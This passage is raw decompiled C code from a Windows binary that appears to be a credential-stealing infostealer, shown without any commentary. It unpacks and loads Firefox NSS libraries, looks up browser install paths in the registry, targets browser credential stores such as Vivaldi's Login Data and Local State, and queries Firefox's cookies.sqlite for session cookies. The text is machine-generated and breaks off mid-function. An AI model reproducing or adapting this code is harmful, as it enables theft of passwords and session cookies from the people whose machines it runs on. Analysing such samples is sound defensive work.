    int32_t * hLibModule4 = (int32_t *)(v1 + 212); // 0x40e30b
    *hLibModule3 = 0;
    FreeLibrary((int32_t *)*hLibModule4);
    int32_t * hLibModule5 = (int32_t *)(v1 + 204); // 0x40e319
    *hLibModule4 = 0;
    bool result = FreeLibrary((int32_t *)*hLibModule5); // 0x40e325
    *hLibModule5 = 0;
    return result;
}

// Address range: 0x40e331 - 0x40eb8e
int32_t function_40e331(int32_t a1, int32_t a2) {
    // 0x40e331
    int32_t lpBuffer; // bp-3644, 0x40e331
    function_401293(&lpBuffer, 0, 260);
    GetCurrentDirectoryW(260, (int16_t *)&lpBuffer);
    int32_t v1; // 0x40e331
    int32_t * v2; // 0x40e372
    if (a2 != 1) {
        goto lab_0x40e74c;
    } else {
        // 0x40e372
        v2 = (int32_t *)(v1 + 212);
        if (*v2 == 0) {
            goto lab_0x40e3a6;
        } else {
            // 0x40e37a
            if (*(int32_t *)(v1 + 200) == 0) {
                goto lab_0x40e3a6;
            } else {
                // 0x40e382
                if (*(int32_t *)(v1 + 204) == 0) {
                    goto lab_0x40e3a6;
                } else {
                    // 0x40e38a
                    if (*(int32_t *)(v1 + 216) == 0) {
                        goto lab_0x40e3a6;
                    } else {
                        // 0x40e392
                        if (*(int32_t *)(v1 + 192) == 0) {
                            goto lab_0x40e3a6;
                        } else {
                            // 0x40e39a
                            if (*(int32_t *)(v1 + 208) != 0) {
                                goto lab_0x40e74c;
                            } else {
                                goto lab_0x40e3a6;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x40e74c:;
    int16_t * lpPathName = (int16_t *)a1; // 0x40e74f
    SetCurrentDirectoryW(lpPathName);
    int16_t * v3 = (int16_t *)&g17; // bp-3676, 0x40e755
    function_4043fa((int16_t *)&g17);
    int32_t v4 = 0; // 0x40e774
    int16_t ** v5 = &v3; // 0x40e774
    int16_t * v6; // bp-3688, 0x40e331
    if (a1 != 0) {
        // 0x40e776
        lstrlenW(lpPathName);
        int32_t v7 = function_406f2c(); // 0x40e782
        int16_t * lpString1 = (int16_t *)v7; // 0x40e78d
        v6 = lpString1;
        lstrcpyW(lpString1, lpPathName);
        v4 = v7;
        v5 = &v6;
    }
    int32_t v8 = (int32_t)v5;
    int32_t v9 = v8 - 4; // 0x40e790
    *(int32_t *)v9 = (int32_t)L"nss3.dll";
    function_4043fa((int16_t *)&g322);
    int32_t v10 = 0; // 0x40e7a3
    int32_t v11 = v9; // 0x40e7a3
    if (a1 != 0) {
        // 0x40e7a5
        *(int32_t *)(v8 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1_ = function_406f2c(); // 0x40e7b1
        *(int32_t *)(v8 - 12) = a1;
        int32_t v12 = v8 - 16; // 0x40e7bc
        *(int32_t *)v12 = lpString1_;
        lstrcpyW((int16_t *)lpString1_, (int16_t *)&g322);
        v10 = lpString1_;
        v11 = v12;
    }
    int32_t v13 = v11 - 4; // 0x40e7bf
    *(int32_t *)v13 = (int32_t)L"msvcr120.dll";
    function_4043fa((int16_t *)&g322);
    int32_t v14 = 0; // 0x40e7d2
    int32_t v15 = v13; // 0x40e7d2
    if (a1 != 0) {
        // 0x40e7d4
        *(int32_t *)(v11 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1__ = function_406f2c(); // 0x40e7e0
        *(int32_t *)(v11 - 12) = a1;
        int32_t v16 = v11 - 16; // 0x40e7eb
        *(int32_t *)v16 = lpString1__;
        lstrcpyW((int16_t *)lpString1__, (int16_t *)&g322);
        v14 = lpString1__;
        v15 = v16;
    }
    int32_t v17 = v15 - 4; // 0x40e7ee
    *(int32_t *)v17 = (int32_t)L"msvcp120.dll";
    function_4043fa((int16_t *)&g322);
    int32_t v18 = 0; // 0x40e801
    int32_t v19 = v17; // 0x40e801
    if (a1 != 0) {
        // 0x40e803
        *(int32_t *)(v15 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1___ = function_406f2c(); // 0x40e80f
        *(int32_t *)(v15 - 12) = a1;
        int32_t v20 = v15 - 16; // 0x40e81a
        *(int32_t *)v20 = lpString1___;
        lstrcpyW((int16_t *)lpString1___, (int16_t *)&g322);
        v18 = lpString1___;
        v19 = v20;
    }
    int32_t v21 = v19 - 4; // 0x40e81d
    *(int32_t *)v21 = (int32_t)L"mozglue.dll";
    function_4043fa((int16_t *)&g322);
    int32_t v22 = v21; // 0x40e830
    if (a1 != 0) {
        // 0x40e832
        *(int32_t *)(v19 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1____ = function_406f2c(); // 0x40e83e
        *(int32_t *)(v19 - 12) = a1;
        int32_t v23 = v19 - 16; // 0x40e849
        *(int32_t *)v23 = lpString1____;
        lstrcpyW((int16_t *)lpString1____, (int16_t *)&g322);
        v22 = v23;
    }
    int32_t v24 = v22 - 4; // 0x40e84c
    *(int32_t *)v24 = (int32_t)L"softokn3.dll";
    function_4043fa((int16_t *)&g322);
    int32_t v25 = 0; // 0x40e85f
    int32_t v26 = v24; // 0x40e85f
    if (a1 != 0) {
        // 0x40e861
        *(int32_t *)(v22 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1_____ = function_406f2c(); // 0x40e86d
        *(int32_t *)(v22 - 12) = a1;
        int32_t v27 = v22 - 16; // 0x40e878
        *(int32_t *)v27 = lpString1_____;
        lstrcpyW((int16_t *)lpString1_____, (int16_t *)&g322);
        v25 = lpString1_____;
        v26 = v27;
    }
    int32_t v28 = v26 - 4; // 0x40e87b
    *(int32_t *)v28 = (int32_t)L"vcruntime140.dll";
    function_4043fa((int16_t *)&g322);
    int32_t v29 = 0; // 0x40e88e
    int32_t v30 = v28; // 0x40e88e
    if (a1 != 0) {
        // 0x40e890
        *(int32_t *)(v26 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1______ = function_406f2c(); // 0x40e89c
        *(int32_t *)(v26 - 12) = a1;
        int32_t v31 = v26 - 16; // 0x40e8a7
        *(int32_t *)v31 = lpString1______;
        lstrcpyW((int16_t *)lpString1______, (int16_t *)&g322);
        v29 = lpString1______;
        v30 = v31;
    }
    int32_t v32 = v30 - 4; // 0x40e8aa
    *(int32_t *)v32 = (int32_t)L"msvcp";
    function_4043fa((int16_t *)&g322);
    int32_t v33 = 0; // 0x40e8bd
    int32_t v34 = v32; // 0x40e8bd
    if (a1 != 0) {
        // 0x40e8bf
        *(int32_t *)(v30 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1_______ = function_406f2c(); // 0x40e8cb
        *(int32_t *)(v30 - 12) = a1;
        int32_t v35 = v30 - 16; // 0x40e8d6
        *(int32_t *)v35 = lpString1_______;
        lstrcpyW((int16_t *)lpString1_______, (int16_t *)&g322);
        v33 = lpString1_______;
        v34 = v35;
    }
    int32_t v36 = v34 - 4; // 0x40e8d9
    *(int32_t *)v36 = (int32_t)L"msvcr";
    function_4043fa((int16_t *)&g322);
    *(int32_t *)(v34 - 8) = 90;
    int32_t v37 = 90;
    int32_t lpString1________ = 0; // 0x40e8f7
    int32_t v38 = v36; // 0x40e8f7
    if (v29 != 0) {
        // 0x40e8f9
        *(int32_t *)(v36 - 4) = v29;
        lstrlenW(NULL);
        lpString1________ = function_406f2c();
        *(int32_t *)(v36 - 8) = v29;
        v38 = v36 - 12;
        *(int32_t *)v38 = lpString1________;
        lstrcpyW((int16_t *)lpString1________, (int16_t *)&g322);
    }
    int32_t v39 = v38;
    int32_t v40 = lpString1________;
    *(int32_t *)(v39 - 4) = v37;
    function_404477((int32_t)&g322);
    *(int32_t *)(v39 - 8) = (int32_t)L".dll";
    function_4043fa((int16_t *)&g322);
    int32_t v41 = v39 - 12; // 0x40e92b
    *(int32_t *)v41 = v40;
    int32_t v42; // 0x40e331
    int32_t v43; // 0x40e331
    while (!PathFileExistsW((int16_t *)&g322)) {
        // 0x40e93b
        function_406f1d();
        v43 = v41;
        v42 = v14;
        if (v37 == 140) {
            goto lab_0x40e97a;
        }
        int32_t v44 = v41;
        v37 += 10;
        lpString1________ = 0;
        v38 = v44;
        if (v29 != 0) {
            // 0x40e8f9
            *(int32_t *)(v44 - 4) = v29;
            lstrlenW(NULL);
            lpString1________ = function_406f2c();
            *(int32_t *)(v44 - 8) = v29;
            v38 = v44 - 12;
            *(int32_t *)v38 = lpString1________;
            lstrcpyW((int16_t *)lpString1________, (int16_t *)&g322);
        }
        // 0x40e916
        v39 = v38;
        v40 = lpString1________;
        *(int32_t *)(v39 - 4) = v37;
        function_404477((int32_t)&g322);
        *(int32_t *)(v39 - 8) = (int32_t)L".dll";
        function_4043fa((int16_t *)&g322);
        v41 = v39 - 12;
        *(int32_t *)v41 = v40;
    }
    int32_t v45 = v41; // 0x40e955
    int32_t v46 = 0; // 0x40e955
    if (v40 != 0) {
        // 0x40e957
        *(int32_t *)(v39 - 16) = v40;
        lstrlenW((int16_t *)&g322);
        int32_t v47 = function_406e8d(); // 0x40e965
        *(int32_t *)(v39 - 20) = v40;
        int32_t v48 = v39 - 24; // 0x40e96f
        *(int32_t *)v48 = v47;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
        v45 = v48;
        v46 = v47;
    }
    // 0x40e975
    function_406f1d();
    v43 = v45;
    v42 = v46;
  lab_0x40e97a:
    // 0x40e97a
    *(int32_t *)(v43 - 4) = 90;
    int32_t v49 = 90;
    int32_t lpString1_________ = 0; // 0x40e987
    int32_t v50 = v43; // 0x40e987
    if (v33 != 0) {
        // 0x40e989
        *(int32_t *)(v43 - 4) = v33;
        lstrlenW(NULL);
        lpString1_________ = function_406f2c();
        *(int32_t *)(v43 - 8) = v33;
        v50 = v43 - 12;
        *(int32_t *)v50 = lpString1_________;
        lstrcpyW((int16_t *)lpString1_________, (int16_t *)&g322);
    }
    int32_t v51 = v50;
    int32_t v52 = lpString1_________;
    *(int32_t *)(v51 - 4) = v49;
    function_404477((int32_t)&g322);
    *(int32_t *)(v51 - 8) = (int32_t)L".dll";
    function_4043fa((int16_t *)&g322);
    int32_t v53 = v51 - 12; // 0x40e9bf
    *(int32_t *)v53 = v52;
    int32_t v54; // 0x40e331
    int32_t v55; // 0x40e331
    while (!PathFileExistsW((int16_t *)&g322)) {
        // 0x40e9cf
        function_406f1d();
        v55 = v53;
        v54 = v10;
        if (v49 == 140) {
            goto lab_0x40ea14;
        }
        int32_t v56 = v53;
        v49 += 10;
        lpString1_________ = 0;
        v50 = v56;
        if (v33 != 0) {
            // 0x40e989
            *(int32_t *)(v56 - 4) = v33;
            lstrlenW(NULL);
            lpString1_________ = function_406f2c();
            *(int32_t *)(v56 - 8) = v33;
            v50 = v56 - 12;
            *(int32_t *)v50 = lpString1_________;
            lstrcpyW((int16_t *)lpString1_________, (int16_t *)&g322);
        }
        // 0x40e9aa
        v51 = v50;
        v52 = lpString1_________;
        *(int32_t *)(v51 - 4) = v49;
        function_404477((int32_t)&g322);
        *(int32_t *)(v51 - 8) = (int32_t)L".dll";
        function_4043fa((int16_t *)&g322);
        v53 = v51 - 12;
        *(int32_t *)v53 = v52;
    }
    int32_t v57 = v53; // 0x40e9eb
    int32_t v58 = 0; // 0x40e9eb
    if (v52 != 0) {
        // 0x40e9ed
        *(int32_t *)(v51 - 16) = v52;
        lstrlenW((int16_t *)&g322);
        int32_t v59 = function_406e8d(); // 0x40e9fb
        *(int32_t *)(v51 - 20) = v52;
        int32_t v60 = v51 - 24; // 0x40ea05
        *(int32_t *)v60 = v59;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
        v57 = v60;
        v58 = v59;
    }
    // 0x40ea0f
    function_406f1d();
    v55 = v57;
    v54 = v58;
  lab_0x40ea14:
    // 0x40ea14
    *(int32_t *)(v55 - 4) = v25;
    int32_t * v61 = LoadLibraryW((int16_t *)&g322); // 0x40ea1d
    *(int32_t *)(v55 - 8) = v54;
    *(int32_t *)(v1 + 216) = (int32_t)v61;
    int32_t * v62 = LoadLibraryW((int16_t *)&g322); // 0x40ea29
    *(int32_t *)(v55 - 12) = v42;
    *(int32_t *)(v1 + 196) = (int32_t)v62;
    int32_t * v63 = LoadLibraryW((int16_t *)&g322); // 0x40ea35
    *(int32_t *)(v55 - 16) = v18;
    *(int32_t *)(v1 + 200) = (int32_t)v63;
    int32_t * v64 = LoadLibraryW((int16_t *)&g322); // 0x40ea43
    int32_t v65 = v55 - 20; // 0x40ea48
    *(int32_t *)v65 = v4;
    *(int32_t *)(v1 + 204) = (int32_t)v64;
    int32_t * v66 = LoadLibraryW((int16_t *)&g322); // 0x40ea51
    int32_t * v67 = (int32_t *)(v1 + 208);
    *v67 = (int32_t)v66;
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    int32_t * v68 = v67; // 0x40ea95
    int32_t v69 = v65; // 0x40ea95
    goto lab_0x40ea9a;
  lab_0x40ea9a:;
    int32_t v70 = *v68; // 0x40ea9a
    int32_t result = 0; // 0x40eaa2
    if (v70 != 0) {
        int32_t * v71 = (int32_t *)(v69 - 4); // 0x40eaab
        *v71 = v70;
        *(int32_t *)(v1 + 132) = function_41473a();
        *(int32_t *)(v1 + 156) = function_41473a();
        *(int32_t *)(v1 + 152) = function_41473a();
        *(int32_t *)(v1 + 140) = function_41473a();
        *(int32_t *)(v1 + 144) = function_41473a();
        *(int32_t *)(v1 + 148) = function_41473a();
        *(int32_t *)(v1 + 136) = function_41473a();
        *(int32_t *)(v1 + 160) = function_41473a();
        *(int32_t *)(v1 + 164) = function_41473a();
        *v71 = (int32_t)&lpBuffer;
        SetCurrentDirectoryW((int16_t *)&g322);
        result = 1;
    }
    // 0x40eb7d
    function_406f1d();
    return result;
  lab_0x40e3a6:;
    int32_t v72 = *(int32_t *)(g170 + 8); // 0x40e3b1
    v3 = (int16_t *)v72;
    int32_t v73; // bp-52, 0x40e331
    function_41780e(&v73, v72, 5);
    int16_t * v74; // 0x40e331
    if (v74 == NULL) {
        // 0x40e3c2
        function_404081();
        // 0x40eb7d
        function_406f1d();
        return 0;
    }
    // 0x40e3cf
    v6 = NULL;
    int32_t lpBuffer7; // bp-2612, 0x40e331
    function_401293(&lpBuffer7, 0, 256);
    v6 = NULL;
    int32_t lpBuffer3; // bp-1076, 0x40e331
    function_401293(&lpBuffer3, 0, 256);
    v6 = NULL;
    int32_t lpBuffer4; // bp-2100, 0x40e331
    function_401293(&lpBuffer4, 0, 256);
    v6 = NULL;
    int32_t lpBuffer5; // bp-1588, 0x40e331
    function_401293(&lpBuffer5, 0, 256);
    v6 = NULL;
    int32_t lpBuffer6; // bp-3124, 0x40e331
    function_401293(&lpBuffer6, 0, 256);
    v6 = NULL;
    int32_t lpBuffer2; // bp-564, 0x40e331
    function_401293(&lpBuffer2, 0, 256);
    int32_t v75 = function_401000(0x519d0); // 0x40e440
    int32_t v76 = function_401000(0x217d0); // 0x40e44f
    int32_t v77 = function_401000(0x6b738); // 0x40e45e
    int32_t v78 = function_401000(0x1303d0); // 0x40e46d
    int32_t v79 = function_401000(0x235d0); // 0x40e47e
    int32_t v80 = function_401000(0x14748); // 0x40e48d
    v6 = (int16_t *)v73;
    function_40126d((int32_t *)v75, (int32_t *)v73, 0x519d0);
    int32_t v81 = v73 + 0x519d0; // 0x40e4a6
    v6 = (int16_t *)v81;
    function_40126d((int32_t *)v76, (int32_t *)v81, 0x217d0);
    int32_t v82 = v73 + 0x731a0; // 0x40e4bd
    v6 = (int16_t *)v82;
    function_40126d((int32_t *)v77, (int32_t *)v82, 0x6b738);
    int32_t v83 = v73 + 0xde8d8; // 0x40e4d4
    v6 = (int16_t *)v83;
    function_40126d((int32_t *)v78, (int32_t *)v83, 0x1303d0);
    int32_t v84 = v73 + 0x20eca8; // 0x40e4e9
    v6 = (int16_t *)v84;
    function_40126d((int32_t *)v79, (int32_t *)v84, 0x235d0);
    int32_t v85 = v73 + 0x232278; // 0x40e500
    v6 = (int16_t *)v85;
    function_40126d((int32_t *)v80, (int32_t *)v85, 0x14748);
    v6 = (int16_t *)256;
    GetTempPathW(256, (int16_t *)&lpBuffer2);
    SetDllDirectoryW((int16_t *)&lpBuffer2);
    lstrcatW((int16_t *)&lpBuffer2, L"softokn3.dll");
    GetTempPathW(256, (int16_t *)&lpBuffer3);
    lstrcatW((int16_t *)&lpBuffer3, L"msvcp140.dll");
    GetTempPathW(256, (int16_t *)&lpBuffer4);
    lstrcatW((int16_t *)&lpBuffer4, L"mozglue.dll");
    GetTempPathW(256, (int16_t *)&lpBuffer5);
    lstrcatW((int16_t *)&lpBuffer5, L"vcruntime140.dll");
    GetTempPathW(256, (int16_t *)&lpBuffer6);
    lstrcatW((int16_t *)&lpBuffer6, L"freebl3.dll");
    GetTempPathW(256, (int16_t *)&lpBuffer7);
    int16_t * v86 = (int16_t *)&lpBuffer7; // bp-3780, 0x40e5d5
    int32_t v87 = (int32_t)&v86; // 0x40e5d5
    lstrcatW((int16_t *)&lpBuffer7, L"nss3.dll");
    if (v79 != 0) {
        if (v78 != 0 && v75 != 0 && v76 != 0 && v77 != 0 && v80 != 0) {
            // 0x40e618
            if (*(char *)v79 == 77) {
                // 0x40e620
                if (*(char *)(v79 + 1) == 90) {
                    // 0x40e625
                    function_415d7c(-48);
                }
            }
            // 0x40e63c
            if (*(char *)v77 == 77) {
                // 0x40e641
                if (*(char *)(v77 + 1) == 90) {
                    // 0x40e646
                    function_415d7c(56);
                }
            }
            // 0x40e659
            if (*(char *)v76 == 77) {
                // 0x40e661
                if (*(char *)(v76 + 1) == 90) {
                    // 0x40e667
                    function_415d7c(-48);
                }
            }
            // 0x40e67a
            if (*(char *)v80 == 77) {
                // 0x40e682
                if (*(char *)(v80 + 1) == 90) {
                    // 0x40e688
                    *(int32_t *)(v87 - 4) = 0x14748;
                    function_415d7c((int32_t)&g322);
                }
            }
            // 0x40e69b
            if (*(char *)v75 == 77) {
                // 0x40e6a0
                if (*(char *)(v75 + 1) == 90) {
                    // 0x40e6a6
                    *(int32_t *)(v87 - 4) = 0x519d0;
                    function_415d7c((int32_t)&g322);
                }
            }
            // 0x40e6b9
            if (*(char *)v78 == 77) {
                // 0x40e6be
                if (*(char *)(v78 + 1) == 90) {
                    // 0x40e6c4
                    *(int32_t *)(v87 - 4) = 0x1303d0;
                    function_415d7c((int32_t)&g322);
                }
            }
        }
    }
    // 0x40e6d7
    *(int32_t *)(v87 - 4) = (int32_t)&lpBuffer3;
    *(int32_t *)(v1 + 200) = (int32_t)LoadLibraryW((int16_t *)&g322);
    *(int32_t *)(v87 - 8) = (int32_t)&lpBuffer5;
    *(int32_t *)(v1 + 216) = (int32_t)LoadLibraryW((int16_t *)&g322);
    *(int32_t *)(v87 - 12) = (int32_t)&lpBuffer4;
    *(int32_t *)(v1 + 204) = (int32_t)LoadLibraryW((int16_t *)&g322);
    *(int32_t *)(v87 - 16) = (int32_t)&lpBuffer7;
    int32_t * v88 = LoadLibraryW((int16_t *)&g322); // 0x40e711
    int32_t * v89 = (int32_t *)(v1 + 208);
    *v89 = (int32_t)v88;
    *(int32_t *)(v87 - 20) = (int32_t)&lpBuffer2;
    *v2 = (int32_t)LoadLibraryW((int16_t *)&g322);
    *(int32_t *)(v87 - 24) = (int32_t)&lpBuffer6;
    int32_t * v90 = LoadLibraryW((int16_t *)&g322); // 0x40e72f
    int32_t v91 = v87 - 28; // 0x40e731
    *(int32_t *)v91 = 100;
    *(int32_t *)(v1 + 192) = (int32_t)v90;
    Sleep((int32_t)&g322);
    function_404081();
    v68 = v89;
    v69 = v91;
    goto lab_0x40ea9a;
}

// Address range: 0x40eb8e - 0x40ec28
int32_t function_40eb8e(void) {
    int32_t lpcbData = 260; // bp-12, 0x40eba2
    int32_t lpType = 1; // bp-16, 0x40ebac
    int32_t lpString1; // bp-536, 0x40eb8e
    function_401293(&lpString1, 0, 260);
    lstrcpyW((int16_t *)&lpString1, L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\");
    int32_t lpString2; // 0x40eb8e
    lstrcatW((int16_t *)&lpString1, (int16_t *)lpString2);
    int32_t phkResult; // bp-8, 0x40eb8e
    int32_t v1 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, (int16_t *)&lpString1, 0, 1, (int32_t **)&phkResult); // 0x40ebf1
    int32_t result = 0; // 0x40ebf9
    if (v1 == 0) {
        // 0x40ebfb
        RegQueryValueExW((int32_t *)phkResult, L"Path", NULL, &lpType, (char *)lpString2, &lpcbData);
        RegCloseKey((int32_t *)phkResult);
        result = 1;
    }
    // 0x40ec23
    return result;
}

// Address range: 0x40ec28 - 0x40efe7
int32_t function_40ec28(int32_t a1) {
    // 0x40ec28
    g170 = a1;
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x40ec47
    int32_t v2; // bp-52, 0x40ec28
    function_41780e(&v2, *(int32_t *)(a1 + 8), 0);
    int32_t v3; // 0x40ec28
    if (v3 == 0) {
        // 0x40efd3
        function_404081();
        return 0;
    }
    int32_t v4 = v1; // bp-88, 0x40ec5f
    int32_t v5 = v1; // bp-92, 0x40ec60
    int32_t v6; // bp-64, 0x40ec28
    function_404094((int32_t)&v6);
    function_40c44e();
    if (function_40c475() == 0 || g172 == 0) {
        // 0x40efbe
        function_406f66();
        function_402771();
        // 0x40efd3
        function_404081();
        return 0;
    }
    // 0x40ec97
    if (*(int32_t *)(g170 + 12) != 0) {
        // 0x40eca6
        function_40f480(&g79, &g78, 0, 0, 1);
        v4 = &g13;
        function_405f32(&v4);
        function_40eff2((int32_t)&g13);
        v4 = g167;
        v5 = &g13;
        function_405f32(&v5);
        if (g167 != 0) {
            // 0x40ed41
            function_401c4b();
        }
        // 0x40efbe
        function_406f66();
        function_402771();
        // 0x40efd3
        function_404081();
        return 0;
    }
    // 0x40ed4c
    function_413915();
    function_413915();
    function_4100de();
    function_40fb4b(&g82, &g81, 0, 0, 1);
    function_40fb4b(&g84, &g83, 0, 0, 6);
    function_40fb4b(&g86, &g85, 0, 0, 7);
    function_40fb4b((int32_t **)0x41a3b8, (int32_t **)0x41a368, 0, 1, 8);
    function_40fb4b(&g88, &g87, 0, 0, 9);
    function_40fb4b(&g90, &g89, 1, 0, 10);
    function_40fb4b(&g92, &g91, 0, 0, 11);
    function_40fb4b(&g94, &g93, 0, 0, 12);
    function_40fb4b(&g96, &g95, 0, 0, 13);
    function_40fb4b((int32_t **)L"\\Vivaldi\\User Data\\Default\\Login Data", (int32_t **)L"\\Vivaldi\\User Data\\Local State", 0, 0, 14);
    function_40fb4b(&g98, &g97, 0, 0, 15);
    function_40fb4b(&g100, &g99, 0, 0, 16);
    int32_t ** v7 = &g102; // bp-376, 0x40eecb
    function_40fb4b(&g102, &g101, 0, 0, 17);
    int32_t v8 = 0; // bp-384, 0x40eedd
    int32_t v9 = 0; // bp-388, 0x40eede
    function_40fb4b(&g104, &g103, 0, 0, 18);
    function_40db12();
    function_40c73a();
    function_404656((int32_t)&v8);
    function_40cd01((int32_t)&g322);
    int32_t v10 = &v9; // 0x40ef33
    function_404656(v10);
    function_40d379((int32_t)&g322);
    function_40c40c();
    function_402917(*(int32_t *)g170);
    function_402917(v10);
    function_405f32((int32_t *)&v7);
    function_40295e();
    function_40295e();
    if (*(int32_t *)(*(int32_t *)g170 + 32) != 0) {
        // 0x40efa7
        function_406f1d();
    }
    // 0x40efac
    function_406f1d();
    function_406f1d();
    // 0x40efbe
    function_406f66();
    function_402771();
    // 0x40efd3
    function_404081();
    return 0;
}

// Address range: 0x40efe7 - 0x40eff2
int32_t function_40efe7(void) {
    // 0x40efe7
    function_40db12();
    return 1;
}

// Address range: 0x40eff2 - 0x40f480
int32_t function_40eff2(int32_t a1) {
    // 0x40eff2
    int16_t * v1; // 0x40eff2
    int16_t * lpString = v1;
    function_413915();
    function_4043fa((int16_t *)&g20);
    int32_t v2; // bp-32, 0x40eff2
    int32_t v3 = &v2; // 0x40f01b
    function_404656(v3);
    function_4043fa(L"profiles.ini");
    function_40460a(L"Profile");
    function_404477(0);
    int32_t lpReturnedString; // bp-652, 0x40eff2
    function_401293(&lpReturnedString, 0, 520);
    int32_t lpAppName; // 0x40eff2
    GetPrivateProfileStringW((int16_t *)lpAppName, L"Path", NULL, (int16_t *)&lpReturnedString, 260, (int16_t *)lpAppName);
    function_404656(v3);
    function_4043fa((int16_t *)&lpReturnedString);
    function_404422("\\cookies.sqlite");
    int32_t v4 = (int32_t)lpString;
    int16_t * v5; // bp-728, 0x40eff2
    *(int32_t *)&v5 = v4;
    int32_t result = 0; // 0x40f0ae
    int32_t * v6; // 0x40eff2
    int32_t * v7; // 0x40eff2
    int32_t v8; // bp-44, 0x40eff2
    int32_t v9; // bp-8, 0x40eff2
    if (!PathFileExistsW(lpString)) {
        goto lab_0x40f456;
    } else {
        int32_t v10 = *(int32_t *)(lpAppName + 64); // 0x40f0b4
        int16_t * v11 = (int16_t *)v10; // bp-36, 0x40f0b9
        int32_t v12 = v10; // 0x40f0c2
        int32_t v13 = (int32_t)&v5; // 0x40f0c2
        if (lpString != NULL) {
            int32_t v14 = WideCharToMultiByte(0, 512, lpString, lstrlenW(lpString), NULL, 0, NULL, NULL); // 0x40f0df
            int32_t v15 = function_406f2c(); // 0x40f0ea
            int16_t * v16; // bp-768, 0x40eff2
            int32_t v17 = (int32_t)&v16; // 0x40f0f8
            int32_t v18 = lstrlenW(lpString); // 0x40f0f9
            *(int32_t *)(v17 - 4) = 0;
            *(int32_t *)(v17 - 8) = 0;
            *(int32_t *)(v17 - 12) = v14;
            *(int32_t *)(v17 - 16) = v15;
            *(int32_t *)(v17 - 20) = v18;
            *(int32_t *)(v17 - 24) = v4;
            *(int32_t *)(v17 - 28) = 0;
            *(int32_t *)(v17 - 32) = 0xfde9;
            WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
            *(int32_t *)(v17 - 36) = v15;
            int32_t v19 = function_40434f((char *)&g322); // 0x40f11d
            v13 = v17 - 40;
            *(int32_t *)v13 = v19;
            function_40415d((int32_t)&g322);
            function_406f1d();
            function_406f1d();
            v12 = (int32_t)v11;
        }
        int32_t * v20 = (int32_t *)(v13 - 4);
        *v20 = (int32_t)&v8;
        int32_t * v21 = (int32_t *)(v13 - 8);
        *v21 = 0;
        function_406f1d();
        result = 0;
        if (v12 != 0) {
            goto lab_0x40f456;
        } else {
            // 0x40f15a
            *v20 = v12;
            *v21 = (int32_t)&v9;
            *(int32_t *)(v13 - 12) = -1;
            *(int32_t *)(v13 - 16) = (int32_t)"SELECT host, path, name, value, expiry, isHttpOnly, isSecure FROM moz_cookies";
            *(int32_t *)(v13 - 20) = v8;
            v7 = v21;
            v6 = v20;
            if (*(int32_t *)(lpAppName + 68) != 0) {
                goto lab_0x40f43f;
            } else {
                int32_t v22 = function_406fa7(); // 0x40f181
                int32_t v23 = v12; // 0x40f18d
                if (v22 != 0) {
                    int32_t v24 = v22 + 4; // 0x40f18f
                    *(int32_t *)v22 = 0x270f;
                    int32_t v25 = v24; // 0x40f194
                    int32_t v26 = 0x270f; // 0x40f194
                    *(int32_t *)v25 = v12;
                    *(int32_t *)(v25 + 4) = v12;
                    *(int32_t *)(v25 + 8) = v12;
                    *(int32_t *)(v25 + 12) = v12;
                    v26--;
                    v25 += 40;
                    v23 = v24;
                    while (v26 != 0) {
                        // 0x40f196
                        *(int32_t *)v25 = v12;
                        *(int32_t *)(v25 + 4) = v12;
                        *(int32_t *)(v25 + 8) = v12;
                        *(int32_t *)(v25 + 12) = v12;
                        v26--;
                        v25 += 40;
                        v23 = v24;
                    }
                }
                // 0x40f1b7
                g167 = v23;
                *v20 = v9;
                int32_t * v27 = (int32_t *)(lpAppName + 96); // 0x40f1ba
                int32_t v28 = *v27; // 0x40f1ba
                g168 = v12;
                int32_t v29 = v28; // 0x40f1c9
                int32_t v30 = v13; // 0x40f1c9
                int32_t v31 = v12; // 0x40f1c9
                if (v28 == 100) {
                    int32_t * v32 = (int32_t *)(lpAppName + 76); // 0x40f1cf
                    int128_t v33; // 0x40eff2
                    int128_t v34 = v33;
                    int32_t v35 = *v32; // 0x40f1cf
                    int32_t v36 = v13 - 4;
                    int32_t * v37 = (int32_t *)v36;
                    *v37 = 0;
                    int32_t v38 = v13 - 8;
                    int32_t * v39 = (int32_t *)v38;
                    *v39 = v9;
                    int32_t * v40 = v39; // 0x40f1eb
                    int32_t v41 = v38; // 0x40f1eb
                    int32_t * v42 = v37; // 0x40f1eb
                    int32_t v43 = v36; // 0x40f1eb
                    int32_t v44 = v13; // 0x40f1eb
                    if (*(char *)v35 != 0) {
                        // 0x40f1ed
                        *v37 = v35;
                        *v39 = function_40434f((char *)v12);
                        function_40415d((int32_t)&g322);
                        function_406f1d();
                        v43 = v13 - 12;
                        v41 = v13 - 16;
                        v40 = (int32_t *)v41;
                        v42 = (int32_t *)v43;
                        v44 = v38;
                    }
                    int32_t * v45 = v42;
                    int32_t v46 = v41;
                    int32_t * v47 = v40;
                    int32_t v48 = *v32; // 0x40f207
                    *v45 = 1;
                    *v47 = v9;
                    int32_t * v49 = v47; // 0x40f216
                    int32_t v50 = v46; // 0x40f216
                    int32_t * v51 = v45; // 0x40f216
                    int32_t v52 = v43; // 0x40f216
                    int32_t v53 = v44; // 0x40f216
                    if (*(char *)v48 != 0) {
                        // 0x40f218
                        *v45 = v48;
                        *v47 = function_40434f((char *)&g322);
                        function_40415d((int32_t)&g322);
                        function_406f1d();
                        v52 = v46 - 4;
                        v50 = v46 - 8;
                        v49 = (int32_t *)v50;
                        v51 = (int32_t *)v52;
                        v53 = v46;
                    }
                    int32_t * v54 = v51;
                    int32_t v55 = v50;
                    int32_t * v56 = v49;
                    int32_t v57 = *v32; // 0x40f232
